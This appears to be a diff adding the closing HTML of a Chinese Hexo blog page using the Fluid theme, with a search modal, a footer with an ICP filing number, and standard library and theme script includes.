+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
